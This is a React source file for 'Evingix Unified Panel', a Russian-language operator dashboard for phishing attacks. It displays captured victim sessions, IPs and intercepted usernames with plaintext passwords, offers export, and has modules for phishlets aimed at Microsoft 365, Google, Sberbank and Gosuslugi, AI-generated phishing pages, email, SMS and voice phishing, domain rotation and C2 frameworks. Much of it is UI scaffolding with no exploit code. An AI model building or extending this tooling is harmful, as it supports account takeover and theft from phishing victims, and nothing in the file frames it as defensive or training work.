'use client'

import { useState, useEffect, useCallback } from 'react'
import { 
  Shield, Activity, Users, Key, Globe, Server, Mail, Bell,
  Settings, Play, Pause, Trash2, Plus, Search, RefreshCw,
  Target, Zap, Brain, Wifi, Globe2, FileText, Link, Eye,
  Database, Lock, Fingerprint, Bot, MessageSquare, Search as SearchIcon,
  ChevronRight, AlertTriangle, CheckCircle, XCircle, Clock
} from 'lucide-react'

// Types
interface Stats {
  total_sessions: number
  active_sessions: number
  total_credentials: number
  active_phishlets: number
  total_requests: number
}

interface Campaign {
  id: string
  name: string
  status: string
  sent: number
  opened: number
}

interface Session {
  id: string
  victim_ip: string
  phishlet: string
  state: string
  created_at: string
}

interface Credential {
  id: string
  username: string
  password: string
  source: string
  captured_at: string
}

import * as api from '@/lib/api-full'

async function apiCall(endpoint: string, options?: RequestInit) {
  // Use the new API client
  try {
    const response = await fetch(`/api/v1${endpoint}`, {
      ...options,
      headers: { 'Content-Type': 'application/json', ...options?.headers },
    })
    if (!response.ok) return null
    return await response.json()
  } catch (e) {
    console.error('API Error:', e)
    return null
  }
}

export default function UnifiedPanel() {
  const [loading, setLoading] = useState(true)
  const [stats, setStats] = useState<Stats | null>(null)
  const [campaigns, setCampaigns] = useState<Campaign[]>([])
  const [sessions, setSessions] = useState<Session[]>([])
  const [credentials, setCredentials] = useState<Credential[]>([])
  const [activeModule, setActiveModule] = useState('dashboard')

  const fetchData = useCallback(async () => {
    try {
      const [statsData, campsData, sessData, credsData] = await Promise.all([
        apiCall('/stats'),
        apiCall('/campaigns'),
        apiCall('/sessions?limit=10'),
        apiCall('/credentials?limit=10'),
      ])
      setStats(statsData)
      setCampaigns(campsData?.campaigns || [])
      setSessions(sessData?.sessions || [])
      setCredentials(credsData?.credentials || [])
    } catch (e) { console.error(e) }
    finally { setLoading(false) }
  }, [])

  useEffect(() => {
    fetchData()
    const interval = setInterval(fetchData, 5000)
    return () => clearInterval(interval)
  }, [fetchData])

  if (loading) {
    return (
      <div className="min-h-screen bg-slate-900 flex items-center justify-center">
        <div className="text-center">
          <Shield className="w-16 h-16 text-blue-500 mx-auto mb-4 animate-pulse" />
          <p className="text-blue-400">Загрузка Evingix...</p>
        </div>
      </div>
    )
  }

  // Navigation items
  const modules = [
    { id: 'dashboard', label: 'Главная', icon: Activity },
    { id: 'phishing', label: 'Фишинг', icon: Globe },
    { id: 'campaigns', label: 'Кампании', icon: Mail },
    { id: 'sessions', label: 'Сессии', icon: Users },
    { id: 'credentials', label: 'Данные', icon: Key },
    { id: 'ai', label: 'AI Модуль', icon: Brain },
    { id: 'c2', label: 'C2 Управление', icon: Bot },
    { id: 'vishing', label: 'Vishing', icon: MessageSquare },
    { id: 'smishing', label: 'Smishing', icon: MessageSquare },
    { id: 'domains', label: 'Домены', icon: Globe2 },
    { id: 'risk', label: 'Риск Анализ', icon: AlertTriangle },
    { id: 'logs', label: 'Логи', icon: FileText },
    { id: 'settings', label: 'Настройки', icon: Settings },
  ]

  return (
    <div className="min-h-screen bg-slate-900 text-white">
      {/* Header */}
      <header className="bg-slate-800 border-b border-slate-700 px-6 py-3">
        <div className="flex items-center justify-between">
          <div className="flex items-center space-x-4">
            <Shield className="w-8 h-8 text-blue-500" />
            <div>
              <h1 className="text-lg font-bold">Evingix <span className="text-blue-400">Unified Panel</span></h1>
              <p className="text-xs text-slate-400">Полное управление</p>
            </div>
          </div>
          <div className="flex items-center space-x-4">
            <button onClick={fetchData} className="p-2 hover:bg-slate-700 rounded-lg">
              <RefreshCw className="w-4 h-4" />
            </button>
            <div className="flex items-center gap-2 px-3 py-1.5 bg-green-900/30 rounded-full">
              <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse" />
              <span className="text-sm text-green-400">Система активна</span>
            </div>
          </div>
        </div>
      </header>

      <div className="flex">
        {/* Sidebar */}
        <nav className="w-56 bg-slate-800/50 border-r border-slate-700 py-4">
          <div className="space-y-1 px-2">
            {modules.map((mod) => (
              <button
                key={mod.id}
                onClick={() => setActiveModule(mod.id)}
                className={`w-full flex items-center space-x-3 px-3 py-2 rounded-lg text-sm transition-colors ${
                  activeModule === mod.id 
                    ? 'bg-blue-600 text-white' 
                    : 'text-slate-400 hover:bg-slate-700 hover:text-white'
                }`}
              >
                <mod.icon className="w-4 h-4" />
                <span>{mod.label}</span>
              </button>
            ))}
          </div>
        </nav>

        {/* Main Content */}
        <main className="flex-1 p-6">
          {activeModule === 'dashboard' && <DashboardView stats={stats} sessions={sessions} credentials={credentials} campaigns={campaigns} />}
          {activeModule === 'phishing' && <PhishingView />}
          {activeModule === 'campaigns' && <CampaignsView campaigns={campaigns} />}
          {activeModule === 'sessions' && <SessionsView sessions={sessions} />}
          {activeModule === 'credentials' && <CredentialsView credentials={credentials} />}
          {activeModule === 'ai' && <AIModuleView />}
          {activeModule === 'c2' && <C2View />}
          {activeModule === 'vishing' && <VishingView />}
          {activeModule === 'smishing' && <SmishingView />}
          {activeModule === 'domains' && <DomainsView />}
          {activeModule === 'risk' && <RiskView />}
          {activeModule === 'logs' && <LogsView />}
          {activeModule === 'settings' && <SettingsView />}
        </main>
      </div>
    </div>
  )
}

// Dashboard View
function DashboardView({ stats, sessions, credentials, campaigns }: { 
  stats: Stats | null; sessions: Session[]; credentials: Credential[]; campaigns: Campaign[] 
}) {
  return (
    <div className="space-y-6">
      {/* Stats */}
      <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
        <div className="bg-slate-800 rounded-xl p-4">
          <div className="flex items-center gap-3 mb-2">
            <Users className="w-5 h-5 text-blue-400" />
            <span className="text-slate-400 text-sm">Сессии</span>
          </div>
          <p className="text-2xl font-bold">{stats?.total_sessions || 0}</p>
          <p className="text-xs text-green-400">{stats?.active_sessions || 0} активных</p>
        </div>
        <div className="bg-slate-800 rounded-xl p-4">
          <div className="flex items-center gap-3 mb-2">
            <Key className="w-5 h-5 text-green-400" />
            <span className="text-slate-400 text-sm">Данные</span>
          </div>
          <p className="text-2xl font-bold">{stats?.total_credentials || 0}</p>
          <p className="text-xs text-slate-400">перехвачено</p>
        </div>
        <div className="bg-slate-800 rounded-xl p-4">
          <div className="flex items-center gap-3 mb-2">
            <Globe className="w-5 h-5 text-purple-400" />
            <span className="text-slate-400 text-sm">Фишлеты</span>
          </div>
          <p className="text-2xl font-bold">{stats?.active_phishlets || 0}</p>
          <p className="text-xs text-slate-400">активных целей</p>
        </div>
        <div className="bg-slate-800 rounded-xl p-4">
          <div className="flex items-center gap-3 mb-2">
            <Mail className="w-5 h-5 text-orange-400" />
            <span className="text-slate-400 text-sm">Кампании</span>
          </div>
          <p className="text-2xl font-bold">{campaigns.length}</p>
          <p className="text-xs text-slate-400">всего кампаний</p>
        </div>
      </div>

      {/* Quick Actions */}
      <div className="grid grid-cols-3 md:grid-cols-6 gap-3">
        {[
          { icon: Globe, label: 'Фишинг', color: 'blue' },
          { icon: Mail, label: 'Кампания', color: 'green' },
          { icon: Brain, label: 'AI Генерация', color: 'purple' },
          { icon: Bot, label: 'C2', color: 'red' },
          { icon: MessageSquare, label: 'Vishing', color: 'orange' },
          { icon: Link, label: 'Домены', color: 'cyan' },
        ].map((action, i) => (
          <button key={i} className={`p-4 bg-slate-800 rounded-xl hover:bg-slate-700 transition-colors text-center`}>
            <action.icon className={`w-6 h-6 mx-auto mb-2 text-${action.color}-400`} />
            <p className="text-sm">{action.label}</p>
          </button>
        ))}
      </div>

      {/* Recent Activity */}
      <div className="grid md:grid-cols-2 gap-6">
        <div className="bg-slate-800 rounded-xl p-4">
          <h3 className="font-semibold mb-4">Последние сессии</h3>
          <div className="space-y-2">
            {sessions.slice(0, 5).map((s) => (
              <div key={s.id} className="flex items-center justify-between p-2 bg-slate-700/50 rounded">
                <code className="text-sm">{s.victim_ip}</code>
                <span className={`text-xs px-2 py-0.5 rounded ${s.state === 'active' ? 'bg-green-900 text-green-300' : 'bg-slate-600'}`}>
                  {s.state}
                </span>
              </div>
            ))}
          </div>
        </div>
        <div className="bg-slate-800 rounded-xl p-4">
          <h3 className="font-semibold mb-4">Последние данные</h3>
          <div className="space-y-2">
            {credentials.slice(0, 5).map((c) => (
              <div key={c.id} className="flex items-center justify-between p-2 bg-slate-700/50 rounded">
                <code className="text-sm text-blue-400">{c.username}</code>
                <span className="text-xs text-slate-500">{new Date(c.captured_at).toLocaleTimeString()}</span>
              </div>
            ))}
          </div>
        </div>
      </div>
    </div>
  )
}

// Placeholder Views for each module
function PhishingView() {
  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <h2 className="text-xl font-semibold">Управление фишингом</h2>
        <button className="flex items-center gap-2 px-4 py-2 bg-blue-600 rounded-lg hover:bg-blue-700">
          <Plus className="w-4 h-4" /> Добавить фишлет
        </button>
      </div>
      <div className="bg-slate-800 rounded-xl p-8 text-center">
        <Globe className="w-12 h-12 text-slate-600 mx-auto mb-4" />
        <p className="text-slate-400">Выберите фишлет для активации</p>
        <div className="grid grid-cols-4 gap-4 mt-6">
          {['Microsoft 365', 'Google Workspace', 'Сбербанк', 'Госуслуги', 'Яндекс', 'Telegram', 'VK', 'Ozon'].map((name) => (
            <button key={name} className="p-4 bg-slate-700/50 rounded-lg hover:bg-slate-600 transition-colors">
              <Globe className="w-8 h-8 mx-auto mb-2 text-blue-400" />
              <p className="text-sm">{name}</p>
            </button>
          ))}
        </div>
      </div>
    </div>
  )
}

function CampaignsView({ campaigns }: { campaigns: Campaign[] }) {
  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <h2 className="text-xl font-semibold">Email Кампании</h2>
        <button className="flex items-center gap-2 px-4 py-2 bg-blue-600 rounded-lg hover:bg-blue-700">
          <Plus className="w-4 h-4" /> Создать кампанию
        </button>
      </div>
      <div className="space-y-3">
        {campaigns.length > 0 ? campaigns.map((c) => (
          <div key={c.id} className="bg-slate-800 rounded-xl p-4 flex items-center justify-between">
            <div>
              <h3 className="font-semibold">{c.name}</h3>
              <p className="text-sm text-slate-400">Отправлено: {c.sent} | Открыто: {c.opened}</p>
            </div>
            <span className={`px-3 py-1 rounded text-sm ${c.status === 'running' ? 'bg-green-900 text-green-300' : 'bg-slate-600'}`}>
              {c.status}
            </span>
          </div>
        )) : (
          <div className="bg-slate-800 rounded-xl p-8 text-center">
            <Mail className="w-12 h-12 text-slate-600 mx-auto mb-4" />
            <p className="text-slate-400">Нет активных кампаний</p>
          </div>
        )}
      </div>
    </div>
  )
}

function SessionsView({ sessions }: { sessions: Session[] }) {
  return (
    <div className="space-y-6">
      <h2 className="text-xl font-semibold">Активные сессии</h2>
      <div className="bg-slate-800 rounded-xl overflow-hidden">
        <table className="w-full">
          <thead className="bg-slate-700/50">
            <tr>
              <th className="px-4 py-3 text-left text-sm text-slate-400">IP</th>
              <th className="px-4 py-3 text-left text-sm text-slate-400">Фишлет</th>
              <th className="px-4 py-3 text-left text-sm text-slate-400">Статус</th>
              <th className="px-4 py-3 text-left text-sm text-slate-400">Время</th>
            </tr>
          </thead>
          <tbody>
            {sessions.map((s) => (
              <tr key={s.id} className="border-t border-slate-700">
                <td className="px-4 py-3 font-mono">{s.victim_ip}</td>
                <td className="px-4 py-3">{s.phishlet}</td>
                <td className="px-4 py-3">
                  <span className={`px-2 py-1 rounded text-xs ${s.state === 'active' ? 'bg-green-900 text-green-300' : 'bg-slate-600'}`}>
                    {s.state}
                  </span>
                </td>
                <td className="px-4 py-3 text-slate-400 text-sm">{new Date(s.created_at).toLocaleString()}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    </div>
  )
}

function CredentialsView({ credentials }: { credentials: Credential[] }) {
  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <h2 className="text-xl font-semibold">Перехваченные данные</h2>
        <button className="px-4 py-2 bg-green-600 rounded-lg hover:bg-green-700">Экспорт</button>
      </div>
      <div className="space-y-3">
        {credentials.map((c) => (
          <div key={c.id} className="bg-slate-800 rounded-xl p-4 flex items-center justify-between">
            <div>
              <code className="text-blue-400">{c.username}</code>
              <p className="text-xs text-slate-500 mt-1">Источник: {c.source}</p>
            </div>
            <code className="text-green-400">{c.password}</code>
          </div>
        ))}
      </div>
    </div>
  )
}

function AIModuleView() {
  return (
    <div className="space-y-6">
      <h2 className="text-xl font-semibold">AI Модуль</h2>
      <div className="grid md:grid-cols-2 gap-4">
        <div className="bg-slate-800 rounded-xl p-6">
          <Brain className="w-10 h-10 text-purple-400 mb-4" />
          <h3 className="font-semibold mb-2">Генерация фишлета</h3>
          <p className="text-sm text-slate-400 mb-4">Создайте фишинговую страницу с помощью AI</p>
          <input type="text" placeholder="URL цели (например: microsoft.com)" className="w-full px-4 py-2 bg-slate-700 rounded-lg mb-3" />
          <button className="w-full py-2 bg-purple-600 rounded-lg hover:bg-purple-700">Сгенерировать</button>
        </div>
        <div className="bg-slate-800 rounded-xl p-6">
          <Target className="w-10 h-10 text-red-400 mb-4" />
          <h3 className="font-semibold mb-2">Анализ цели</h3>
          <p className="text-sm text-slate-400 mb-4">Проанализируйте безопасность целевого сайта</p>
          <input type="text" placeholder="URL для анализа" className="w-full px-4 py-2 bg-slate-700 rounded-lg mb-3" />
          <button className="w-full py-2 bg-red-600 rounded-lg hover:bg-red-700">Анализировать</button>
        </div>
      </div>
    </div>
  )
}

function C2View() {
  return (
    <div className="space-y-6">
      <h2 className="text-xl font-semibold">C2 Управление</h2>
      <div className="grid md:grid-cols-3 gap-4">
        {['Sliver', 'Cobalt Strike', 'Empire'].map((c2) => (
          <div key={c2} className="bg-slate-800 rounded-xl p-4">
            <div className="flex items-center justify-between mb-4">
              <Bot className="w-8 h-8 text-red-400" />
              <span className="px-2 py-1 bg-slate-700 rounded text-xs">Не подключен</span>
            </div>
            <h3 className="font-semibold">{c2}</h3>
            <button className="mt-4 w-full py-2 bg-slate-700 rounded-lg hover:bg-slate-600">Настроить</button>
          </div>
        ))}
      </div>
    </div>
  )
}

function VishingView() {
  return (
    <div className="space-y-6">
      <h2 className="text-xl font-semibold">Vishing (Голосовой фишинг)</h2>
      <div className="bg-slate-800 rounded-xl p-6">
        <MessageSquare className="w-10 h-10 text-orange-400 mb-4" />
        <p className="text-slate-400 mb-4">Автоматические голосовые звонки с AI</p>
        <input type="text" placeholder="Номер телефона" className="w-full px-4 py-2 bg-slate-700 rounded-lg mb-3" />
        <input type="text" placeholder="Сценарий" className="w-full px-4 py-2 bg-slate-700 rounded-lg mb-3" />
        <button className="w-full py-2 bg-orange-600 rounded-lg hover:bg-orange-700">Запустить звонок</button>
      </div>
    </div>
  )
}

function SmishingView() {
  return (
    <div className="space-y-6">
      <h2 className="text-xl font-semibold">Smishing (SMS фишинг)</h2>
      <div className="bg-slate-800 rounded-xl p-6">
        <MessageSquare className="w-10 h-10 text-green-400 mb-4" />
        <p className="text-slate-400 mb-4">Отправка фишинговых SMS</p>
        <input type="text" placeholder="Номер телефона" className="w-full px-4 py-2 bg-slate-700 rounded-lg mb-3" />
        <textarea placeholder="Текст сообщения" className="w-full px-4 py-2 bg-slate-700 rounded-lg mb-3 h-24" />
        <button className="w-full py-2 bg-green-600 rounded-lg hover:bg-green-700">Отправить SMS</button>
      </div>
    </div>
  )
}

function DomainsView() {
  return (
    <div className="space-y-6">
      <h2 className="text-xl font-semibold">Управление доменами</h2>
      <div className="bg-slate-800 rounded-xl p-6">
        <Globe2 className="w-10 h-10 text-cyan-400 mb-4" />
        <p className="text-slate-400 mb-4">Регистрация и ротация доменов</p>
        <input type="text" placeholder="Домен" className="w-full px-4 py-2 bg-slate-700 rounded-lg mb-3" />
        <button className="w-full py-2 bg-cyan-600 rounded-lg hover:bg-cyan-700">Зарегистрировать</button>
      </div>
    </div>
  )
}

function RiskView() {
  return (
    <div className="space-y-6">
      <h2 className="text-xl font-semibold">Анализ рисков</h2>
      <div className="grid md:grid-cols-2 gap-4">
        <div className="bg-slate-800 rounded-xl p-6">
          <AlertTriangle className="w-10 h-10 text-yellow-400 mb-4" />
          <h3 className="font-semibold mb-2">Распределение рисков</h3>
          <div className="space-y-2">
            <div className="flex justify-between"><span>Критический</span><span className="text-red-400">68</span></div>
            <div className="flex justify-between"><span>Высокий</span><span className="text-orange-400">178</span></div>
            <div className="flex justify-between"><span>Средний</span><span className="text-yellow-400">289</span></div>
            <div className="flex justify-between"><span>Низкий</span><span className="text-green-400">312</span></div>
          </div>
        </div>
        <div className="bg-slate-800 rounded-xl p-6">
          <Users className="w-10 h-10 text-red-400 mb-4" />
          <h3 className="font-semibold mb-2">Высокий риск</h3>
          <p className="text-sm text-slate-400">Пользователи с высоким уровнем риска</p>
        </div>
      </div>
    </div>
  )
}

function LogsView() {
  return (
    <div className="space-y-6">
      <h2 className="text-xl font-semibold">Системные логи</h2>
      <div className="bg-slate-800 rounded-xl p-4 h-[500px] overflow-y-auto font-mono text-sm">
        <div className="space-y-1">
          {[
            { time: '10:23:45', level: 'INFO', msg: 'AiTM proxy initialized on :8443' },
            { time: '10:24:12', level: 'SUCCESS', msg: 'Session captured: microsoft_365' },
            { time: '10:25:33', level: 'WARNING', msg: 'High risk user detected: 192.168.1.105' },
            { time: '10:26:01', level: 'INFO', msg: 'Credential intercepted: user@corp.com' },
          ].map((log, i) => (
            <div key={i} className="flex items-start gap-3 p-2 hover:bg-slate-700/30 rounded">
              <span className="text-slate-500">{log.time}</span>
              <span className={`px-2 py-0.5 rounded text-xs ${
                log.level === 'SUCCESS' ? 'bg-green-900 text-green-400' :
                log.level === 'WARNING' ? 'bg-yellow-900 text-yellow-400' :
                'bg-blue-900 text-blue-400'
              }`}>{log.level}</span>
              <span className="text-slate-300">{log.msg}</span>
            </div>
          ))}
        </div>
      </div>
    </div>
  )
}

function SettingsView() {
  return (
    <div className="space-y-6">
      <h2 className="text-xl font-semibold">Настройки</h2>
      <div className="bg-slate-800 rounded-xl p-6 space-y-4 max-w-xl">
        <div>
          <label className="block text-sm text-slate-400 mb-2">API Порт</label>
          <input type="number" defaultValue={8080} className="w-full px-4 py-2 bg-slate-700 rounded-lg" />
        </div>
        <div>
          <label className="block text-sm text-slate-400 mb-2">HTTPS Порт</label>
          <input type="number" defaultValue={8443} className="w-full px-4 py-2 bg-slate-700 rounded-lg" />
        </div>
        <div>
          <label className="block text-sm text-slate-400 mb-2">API Ключ</label>
          <input type="password" defaultValue="change-me" className="w-full px-4 py-2 bg-slate-700 rounded-lg" />
        </div>
        <button className="px-6 py-2 bg-blue-600 rounded-lg hover:bg-blue-700">Сохранить</button>
      </div>
    </div>
  )
}
